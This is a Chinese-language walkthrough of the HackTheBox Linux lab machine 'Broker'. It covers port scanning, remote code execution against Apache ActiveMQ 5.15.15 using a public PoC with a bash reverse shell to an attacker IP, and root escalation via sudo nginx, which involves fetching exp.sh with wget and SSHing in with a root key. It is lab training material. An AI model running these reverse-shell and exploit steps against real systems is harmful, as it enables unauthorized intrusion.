---
title: "Broker"
description: "这篇HackTheBox Linux 靶机 Broker 复盘用一句话串起了信息收集、立足点获取与本地提权的完整路径。"
summary: "这篇HackTheBox Linux 靶机 Broker 复盘用一句话串起了信息收集、立足点获取与本地提权的完整路径。"
date: "2024-10-05T17:11:00+08:00"
publishDate: "2024-10-05T17:11:00+08:00"
lastmod: "2024-10-05T17:11:00+08:00"
url: "/hackthebox/linux/broker/"
image: "images/oscp-banners/banner-012.jpg"
draft: false
unfinished: false
categories:
  - "OSCP"
  - "HackTheBox"
tags:
  - "Linux"
oscp_provider: "HackTheBox"
oscp_platform: "Linux"
---
<!-- oscp-refactor:meta-start -->
> 平台：Linux ｜ 来源：HackTheBox
<!-- oscp-refactor:meta-end -->

对目标服务器进行端口探测

```
sudo nmap -p- 10.10.11.243 -open
```

![image-20240910223045005](https://s2.loli.net/2024/09/10/BuzTrZ51OvpU6YM.png)

对开放端口进一步扫描

```
sudo nmap -p22,80,1883,5672,8161,32803,61613,61614,61616 -A 10.10.11.243 -oX Broker.xml
```

![image-20240910225022256](https://s2.loli.net/2024/09/10/3gB7dmkNrLI46fV.png)

![image-20240910225035974](https://s2.loli.net/2024/09/10/ushqiYlO7MweANp.png)

端口众多，

1.22端口

22端口openssh版本为8.9，没有明显可以利用的地方

2.80，8161,61614端口

根据nmap的结果看是存在一个认证服务，通过浏览器访问，也确实是存在一个认证窗口，如果输入错误会返回以下页面

![image-20240910225754977](https://s2.loli.net/2024/09/10/7gfa9Q3vPzpr2XI.png)

![image-20240911150638885](https://s2.loli.net/2024/09/11/F7Rs9rm5CcKd6oh.png)

查询对应的jetty版本，不存在对应的可利用漏洞

61614端口上提示存在TRACE危险方法，但尝试后没有直接结果

3.1883，5672端口

根据查询mqtt和amqp都应当是消息端口

4.61613，61616

![image-20240911154003021](https://files.seeusercontent.com/2026/04/06/Gtr7/image-20240911154003021.png)

在nmap扫描得到的信息中可以看到对应的activemq的版本为5.15.15，用户为ActiveMQ，根据google搜索得到的信息，该版本可以存在漏洞，可以进行RCE尝试

（https://github.com/wy876/POC/blob/main/Apache/Apache%20ActiveMQ%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md）

```
#尝试了几次后，使用了这个项目的RCE脚本https://github.com/X1r0z/ActiveMQ-RCE?tab=readme-ov-file
vi poc.xml
                <value>open</value>
                <value>-a</value>
                <value>calculator</value>
                <!-- <value>bash</value>
                <value>-c</value>
                <value>touch /tmp/success</value> -->
                
修改为远程shell脚本
                <value>bash</value>
                <value>-c</value>
                <value>bash -i &gt;&amp; /dev/tcp/10.10.16.15/12345 0&gt;&amp;1</value>

编译
go build main.go

./main -i 10.10.11.243 -u http://10.10.16.15/poc.xml
```

![image-20240911163628961](https://files.seeusercontent.com/2026/04/06/Tm1f/image-20240911163628961.png)

成功突破边界

![image-20240911163643112](https://files.seeusercontent.com/2026/04/06/aa6C/image-20240911163643112.png)

使用sudo -l后发现具备权限

![image-20240911163935745](https://s2.loli.net/2024/09/11/vge4XdtpGJQB7sk.png)

通过gtfobins没有搜索到naginx的sudo用法，但通过google搜索到以下方法（https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406）

进行尝试，成功

```
vi exp.sh
cd /home/activemq
wget http://10.10.16.15/exp.sh
chmod +x exp.sh
chmod 600 root_key
ssh -i root_key root@10.10.11.243
```

![image-20240911175105619](https://s2.loli.net/2024/09/11/f1yIpRZ7bql3PmA.png)

